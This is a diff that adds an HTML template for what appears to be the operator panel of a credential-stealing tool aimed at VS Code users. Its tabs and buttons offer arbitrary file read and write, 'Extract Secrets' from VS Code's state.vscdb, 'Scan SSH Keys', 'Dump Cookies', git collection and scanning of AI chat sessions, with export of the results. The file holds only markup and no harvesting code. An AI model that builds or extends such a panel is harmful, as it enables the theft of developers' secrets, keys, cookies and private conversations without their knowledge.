@@ -1,0 +1,299 @@
+<style>
+    #vsc-file-path-input, #vsc-write-textarea, #vsc-dir-input {
+        background-color: #aaa !important;
+        color: #000 !important;
+    }
+    #vsc-file-path-input::placeholder, #vsc-dir-input::placeholder {
+        color: #8b8680;
+        font-size: 0.9em;
+    }
+    #vsc-file-viewer {
+        background: #1e1e1e;
+        color: #ccc;
+        font-family: monospace;
+        font-size: 0.85em;
+        white-space: pre-wrap;
+        word-break: break-all;
+        padding: 10px;
+        border-radius: 4px;
+        overflow: auto;
+        min-height: 200px;
+        max-height: 450px;
+    }
+    #vsc-chat-viewer {
+        overflow-y: auto;
+        max-height: 450px;
+        padding: 8px;
+    }
+    .vsc-chat-user {
+        background: #3a3f44;
+        border-radius: 6px;
+        padding: 8px 12px;
+        margin-bottom: 6px;
+    }
+    .vsc-chat-ai {
+        background: #272b30;
+        border: 1px solid #52565a;
+        border-radius: 6px;
+        padding: 8px 12px;
+        margin-bottom: 6px;
+    }
+    .vsc-sidebar-item {
+        padding: 4px 8px;
+        cursor: pointer;
+        border-radius: 3px;
+        font-size: 0.85em;
+    }
+    .vsc-sidebar-item:hover {
+        background: rgba(255,255,255,0.08);
+    }
+    .vsc-sidebar-item.active {
+        background: rgba(255,255,255,0.12);
+        border-left: 3px solid #62c462;
+    }
+    .vsc-dir-entry {
+        padding: 3px 6px;
+        cursor: pointer;
+        font-size: 0.85em;
+    }
+    .vsc-dir-entry:hover {
+        background: rgba(255,255,255,0.08);
+    }
+</style>
+<div class="mt-2">
+    <ul class="nav nav-tabs mb-2" id="vsc-tabs">
+        <li class="nav-item">
+            <a class="nav-link active" href="#" data-vsc-tab="project">Project</a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" href="#" data-vsc-tab="files">Files</a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" href="#" data-vsc-tab="git">Git &amp; Creds</a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" href="#" data-vsc-tab="chat">Chat History</a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" href="#" data-vsc-tab="errors">Errors</a>
+        </li>
+    </ul>
+
+    <!-- ===== Project Tab ===== -->
+    <div id="vsc-tab-project">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+            <span class="text-muted small" id="vsc-project-status">Loading...</span>
+            <div>
+                <button class="btn btn-primary btn-sm" id="vsc-refresh-btn">Refresh</button>
+                <button class="btn btn-secondary btn-sm" id="vsc-export-btn">Export JSON</button>
+                <button class="btn btn-secondary btn-sm" id="vsc-clear-btn">Clear Data</button>
+            </div>
+        </div>
+
+        <div class="row g-2" id="vsc-project-cards">
+            <!-- Workspace Path -->
+            <div class="col-12">
+                <div class="card">
+                    <div class="card-body p-2">
+                        <span class="text-muted small">Workspace</span>
+                        <div class="text-white" id="vsc-workspace-path" style="font-family:monospace;font-size:0.9em">--</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Open Editors -->
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-body p-2">
+                        <span class="text-muted small">Open Editors</span>
+                        <div id="vsc-open-editors" style="max-height:180px;overflow:auto;font-size:0.85em">
+                            <span class="text-muted">--</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Recent Projects -->
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-body p-2">
+                        <span class="text-muted small">Recent Projects</span>
+                        <div id="vsc-recent-projects" style="max-height:180px;overflow:auto;font-size:0.85em">
+                            <span class="text-muted">--</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Extensions -->
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-body p-2">
+                        <span class="text-muted small">Installed Extensions</span>
+                        <div id="vsc-extensions" style="max-height:180px;overflow:auto;font-size:0.85em">
+                            <span class="text-muted">--</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- File Tree -->
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-body p-2">
+                        <span class="text-muted small">Workspace Root</span>
+                        <div id="vsc-file-tree" style="max-height:180px;overflow:auto;font-size:0.85em">
+                            <span class="text-muted">--</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Files Tab ===== -->
+    <div id="vsc-tab-files" style="display:none">
+        <div class="d-flex mb-2" style="gap:8px">
+            <input type="text" class="form-control form-control-sm" placeholder="Enter file path..." id="vsc-file-path-input" style="flex:1">
+            <button class="btn btn-primary btn-sm" id="vsc-read-file-btn" style="min-width:70px">Read</button>
+            <button class="btn btn-primary btn-sm" id="vsc-edit-toggle-btn" style="min-width:60px;display:none">Edit</button>
+        </div>
+
+        <div class="d-flex" style="gap:12px;height:480px">
+            <!-- Directory sidebar -->
+            <div style="width:220px;min-width:220px;display:flex;flex-direction:column">
+                <div class="d-flex mb-1" style="gap:4px">
+                    <input type="text" class="form-control form-control-sm" placeholder="Path..." id="vsc-dir-input" style="flex:1">
+                    <button class="btn btn-primary btn-sm" id="vsc-dir-go-btn">Go</button>
+                </div>
+                <div class="text-muted small mb-1" id="vsc-dir-breadcrumb" style="font-family:monospace;word-break:break-all"></div>
+                <button class="btn btn-secondary btn-sm mb-1" id="vsc-dir-up-btn" style="display:none">.. (Parent)</button>
+                <div id="vsc-dir-listing" style="flex:1;overflow-y:auto;border:1px solid #52565a;border-radius:4px;padding:4px">
+                    <div class="text-muted small p-2">Click "Go" to browse</div>
+                </div>
+            </div>
+
+            <!-- File content area -->
+            <div style="flex:1;display:flex;flex-direction:column">
+                <div class="d-flex align-items-center mb-1">
+                    <span class="text-white small fw-bold" id="vsc-file-name">No file selected</span>
+                    <span class="text-muted small ms-2" id="vsc-file-size"></span>
+                </div>
+                <div id="vsc-file-viewer" style="flex:1">Select a file to view its contents</div>
+                <!-- Write panel (hidden by default) -->
+                <div id="vsc-write-panel" style="display:none" class="mt-2">
+                    <textarea id="vsc-write-textarea" class="form-control form-control-sm" rows="8" style="font-family:monospace;font-size:0.85em"></textarea>
+                    <div class="d-flex mt-1" style="gap:8px">
+                        <button class="btn btn-primary btn-sm" id="vsc-save-file-btn">Save</button>
+                        <button class="btn btn-secondary btn-sm" id="vsc-cancel-edit-btn">Cancel</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Git & Creds Tab ===== -->
+    <div id="vsc-tab-git" style="display:none">
+        <div class="d-flex justify-content-end mb-2" style="gap:8px">
+            <button class="btn btn-primary btn-sm" id="vsc-git-refresh-btn">Collect Git Info</button>
+            <button class="btn btn-primary btn-sm" id="vsc-secrets-btn">Extract Secrets</button>
+            <button class="btn btn-primary btn-sm" id="vsc-ssh-btn">Scan SSH Keys</button>
+            <button class="btn btn-primary btn-sm" id="vsc-cookies-btn">Dump Cookies</button>
+        </div>
+
+        <!-- Git Info -->
+        <div class="card mb-2">
+            <div class="card-body p-2">
+                <span class="text-muted small">Git Info</span>
+                <div id="vsc-git-info" style="font-size:0.85em">
+                    <span class="text-muted">Click "Collect Git Info" to fetch</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Secrets -->
+        <div class="card mb-2">
+            <div class="card-body p-2">
+                <span class="text-muted small">VS Code Secrets (state.vscdb)</span>
+                <div class="table-responsive" style="max-height:250px;overflow:auto">
+                    <table class="table table-sm table-dark table-striped mb-0">
+                        <thead style="position:sticky;top:0;z-index:1">
+                            <tr><th>Key</th><th>Value</th></tr>
+                        </thead>
+                        <tbody id="vsc-secrets-body">
+                            <tr><td colspan="2" class="text-muted">Not collected</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- SSH Keys -->
+        <div class="card mb-2">
+            <div class="card-body p-2">
+                <span class="text-muted small">SSH Keys</span>
+                <div id="vsc-ssh-keys" style="font-size:0.85em">
+                    <span class="text-muted">Not collected</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cookies -->
+        <div class="card mb-2">
+            <div class="card-body p-2">
+                <span class="text-muted small">Cookies</span>
+                <div class="table-responsive" style="max-height:200px;overflow:auto">
+                    <table class="table table-sm table-dark table-striped mb-0">
+                        <thead style="position:sticky;top:0;z-index:1">
+                            <tr><th>Host</th><th>Name</th><th>Path</th><th>Secure</th><th>HttpOnly</th></tr>
+                        </thead>
+                        <tbody id="vsc-cookies-body">
+                            <tr><td colspan="5" class="text-muted">Not collected</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Chat History Tab ===== -->
+    <div id="vsc-tab-chat" style="display:none">
+        <div class="d-flex justify-content-end mb-2">
+            <button class="btn btn-primary btn-sm" id="vsc-chat-refresh-btn">Scan Sessions</button>
+        </div>
+
+        <div class="d-flex" style="gap:12px;height:500px">
+            <!-- Session sidebar -->
+            <div style="width:240px;min-width:240px;display:flex;flex-direction:column">
+                <span class="text-muted small mb-1">Sessions <span class="badge bg-secondary" id="vsc-chat-count">0</span></span>
+                <div id="vsc-chat-session-list" style="flex:1;overflow-y:auto;border:1px solid #52565a;border-radius:4px;padding:4px">
+                    <div class="text-muted small p-2">Click "Scan Sessions" to find chats</div>
+                </div>
+            </div>
+
+            <!-- Chat viewer -->
+            <div style="flex:1;display:flex;flex-direction:column">
+                <div class="d-flex align-items-center mb-1">
+                    <span class="text-white fw-bold" id="vsc-chat-title">Select a session</span>
+                </div>
+                <div id="vsc-chat-viewer" style="flex:1;border:1px solid #52565a;border-radius:4px;background:#272b30">
+                    <div class="text-muted small p-2">Select a session to view the conversation</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== Errors Tab ===== -->
+    <div id="vsc-tab-errors" style="display:none">
+        <div class="table-responsive" style="max-height:400px;overflow:auto">
+            <table class="table table-sm table-dark table-striped mb-0">
+                <thead style="position:sticky;top:0;z-index:1">
+                    <tr><th>Phase</th><th>Error</th><th>Time</th></tr>
+                </thead>
+                <tbody id="vsc-errors-body">
+                    <tr><td colspan="3" class="text-muted">No errors</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
